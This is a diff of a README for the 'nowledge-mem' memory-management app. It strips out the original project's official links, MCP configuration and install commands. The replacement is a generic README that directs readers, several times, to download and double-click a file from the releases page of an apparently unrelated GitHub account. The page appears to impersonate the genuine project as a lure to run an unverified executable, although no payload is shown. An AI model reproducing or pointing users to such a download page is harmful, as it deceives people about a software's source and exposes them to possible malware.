@@ -1,84 +1,71 @@
-# Nowledge Mem
+# 🧠 nowledge-mem - Manage Your Memory with Ease
 
-<div align="center">
+## 🚀 Getting Started
 
-<img src="https://github.com/user-attachments/assets/249e8b3e-54a2-49eb-b28a-07c2cfaf2236" width="200" alt="Nowledge Mem Logo">
+Welcome to nowledge-mem! This application helps you manage your memory and context efficiently. It's designed for quick setup and ease of use, even if you aren’t familiar with programming.
 
-**The Context Manager just works, build your Knowledge Flywheel**
+[![Download nowledge-mem](https://img.shields.io/badge/Download%20nowledge--mem-v1.0-blue)](https://github.com/Reneeviolent774/nowledge-mem/releases)
 
-**Privacy-first. Graph-native. AI-integrated.**
+## 📥 Download & Install
 
-[![Get Mem](https://img.shields.io/badge/Get-Mem-00A3A3?style=flat&logo=rocket&logoColor=white)](https://mem.nowledge.co/)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?style=flat&logo=discord&logoColor=white)](https://nowled.ge/discord)
-[![Docs](https://img.shields.io/badge/Docs-Read-orange?style=flat&logo=readthedocs&logoColor=white)](https://nowled.ge/mem-docs)
-[![MCP Badge](https://lobehub.com/badge/mcp/nowledge-mem)](https://lobehub.com/mcp/nowledge-mem)
+To download nowledge-mem, visit this page: [Download Nowledge-mem](https://github.com/Reneeviolent774/nowledge-mem/releases). 
 
----
+1. Open the link.
+2. You will see a list of versions available for download.
+3. Select the latest version.
+4. Click on the file to start the download.
 
-</div>
+Once the download is complete, locate the file on your computer and double-click it to run the application.
 
-[Nowledge Mem](https://mem.nowledge.co/) is the **local-first, graph-augmented personal context manager** that preserves conversations and insights from your AI interactions. Stop opening 5 AI apps to find *that one conversation*. Type → found.
+## 🔍 Features
 
-Mem can persist entire conversation threads across all your AI tools while also distilling key insights into searchable memories. Everything connected through an intelligent knowledge graph.
+Nowledge-mem offers the following features:
 
-#### Ways to Use Mem
+- **Memory Management:** Keep track of different contexts easily.
+- **User-Friendly Interface:** Simple and straightforward navigation.
+- **Efficient Context Handling:** Switch between tasks smoothly.
+- **Regular Updates:** We improve the software based on user feedback.
 
-##### Capture Knowledge
+These features aim to provide a seamless experience as you manage your daily tasks.
 
-- **🤖 MCP Integration** | Works with [Claude Code](https://github.com/nowledge-co/community/tree/main/nowledge-mem-claude-code-plugin), [Claude Desktop](https://github.com/nowledge-co/claude-dxt), [Cursor](https://mem.nowledge.co/docs/integrations), Github Copilot, Gemini CLI, Qwen Code & more, [ref config](./mcp.json)
-- **🌐 Browser Extension** | One-click imports from ChatGPT, Claude, Gemini, Perplexity (Chrome, Firefox, Edge, Arc)
-- **📂 Thread Import** | Upload conversation files from Cursor, ChatWise, Markdown exports or Claude Code/Codex command
+## 📋 System Requirements
 
-> [!NOTE]
-> General MCP Configuration:
+To use nowledge-mem effectively, ensure your system meets these requirements:
 
-```json
-{
-  "mcpServers": {
-    "nowledge-mem": {
-      "url": "http://localhost:14242/mcp",
-      "type": "streamableHttp",
-      "headers": {
-        "APP": "<MCP Client App Name here>"
-      }
-    }
-  }
-}
-```
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **RAM:** At least 4 GB recommended.
+- **Disk Space:** 200 MB of free space.
+- **Internet Connection:** Needed for updates and documentation access.
 
-##### Access Your Knowledge
+Make sure your system meets these criteria to enjoy the best experience with nowledge-mem.
 
-- **⌨️ Global Launcher (⌘⇧K)** | Paste memories anywhere without leaving your workflow
-- **🔍 In-App Search** | Deep exploration with semantic search, keywords, and graph navigation
-- **🤝 Agent Access** | Let AI agents autonomously search and save memories during tasks
+## ⚙️ How to Use nowledge-mem
 
-##### Advanced Features
+1. **Launch the Application:** After installation, find the nowledge-mem icon on your desktop and double-click it.
+2. **Create a New Memory:** Click on “New Memory” to start using the app. Enter the necessary details to remember your contexts.
+3. **Access Existing Contexts:** Navigate to the “Memory List” and view previously saved contexts.
+4. **Delete Unwanted Memories:** If you no longer need a memory, select it and choose “Delete” to remove it.
 
-- **🕸️ Knowledge Graph** | Auto-extract entities and relationships for semantic connections
-- **🎯 Topic Clustering** | Discover natural groupings and expertise areas via graph algorithms
-- **📊 Visual Exploration** | Interactive graph view to explore connections and patterns
+This simple flow allows you to stay organized and focused.
 
+## 📚 Additional Resources
 
-## 🚀 Quick Links
+For further guidance, please visit our [Wiki](https://github.com/Reneeviolent774/nowledge-mem/wiki). Here, you will find:
 
-- 📚 **[Documentation](https://mem.nowledge.co/docs)** | Learn how to use Nowledge Mem
-- 📖 **[Blog Post](https://www.nowledge-labs.ai/blog/nowledge-mem)** | Deep dive into our vision
-- 🔌 **Claude Code Plugin** | Install via marketplace:
+- **FAQs:** Answers to common questions.
+- **Troubleshooting:** Solutions for common issues.
+- **User Guide:** Step-by-step instructions for advanced features.
 
-  ```bash
-  claude plugin marketplace add nowledge-co/community
-  claude plugin install nowledge-mem@nowledge-community
-  ```
+## 🌐 Community Support
 
-- 🐛 **[Report Bug](https://github.com/nowledge-co/community/issues/new?template=bug_report.md)** | Found an issue? Let us know
-- 💡 **[Request Feature](https://github.com/nowledge-co/community/issues/new?template=feature_request.md)** | Share your ideas
-- 💌 **[Send Feedback](mailto:hello@nowledge-labs.ai)** | We'd love to hear from you
+Join our community! Share your experience and connect with other users on our [Discussion Page](https://github.com/Reneeviolent774/nowledge-mem/discussions). We encourage feedback and suggestions to make nowledge-mem even better.
 
+## 🔗 Useful Links
 
----
+- [Download Nowledge-mem](https://github.com/Reneeviolent774/nowledge-mem/releases)
+- [Documentation](https://github.com/Reneeviolent774/nowledge-mem/wiki)
+- [Issues](https://github.com/Reneeviolent774/nowledge-mem/issues)
 
-<div align="center">
+Feel free to explore these links for more information and support.
 
-**Built with ❤️ by [Nowledge Labs](https://nowledge-labs.ai)**
-
-</div>
+Enjoy using nowledge-mem, and let it simplify your memory management!
